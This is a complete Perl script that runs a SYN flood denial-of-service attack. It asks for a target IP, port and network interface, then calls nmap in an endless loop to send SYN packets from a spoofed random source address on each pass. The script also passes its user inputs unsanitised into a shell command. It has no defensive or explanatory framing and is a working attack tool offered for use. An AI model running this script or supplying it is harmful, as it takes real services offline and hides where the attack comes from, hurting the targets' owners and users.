#!/usr/bin/perl -w
$|=1;

sub randomip(){
	@digits = ();
	for (0..3) {
		push @digits, int (rand (255) + 1);
	}
	return join '.', @digits;
}
#print randomip();		#DEBUG

sub check_nmap(){
	$result = sprintf(`which nmap`);
	if(length($result)==0){
		die "Please install Nmap.\n";
	}
	return;
}


&check_nmap();
print("Target IP address (e.g. 192.168.0.1): ");
$target_ip=<STDIN>;
chop($target_ip);
print("Target TCP port (e.g. 25): ");
$target_port=<STDIN>;
chop($target_port);
print("Network Interface sending out SYN (e.g. eth0): ");
$network_adapter=<STDIN>;
chop($network_adapter);


print("Launching SYN Flood...");

while(1){
	$src_ip = &randomip();
	system("nmap -e $network_adapter -Pn -sS -T5 -p $target_port -S $src_ip $target_ip");
}

exit(1);
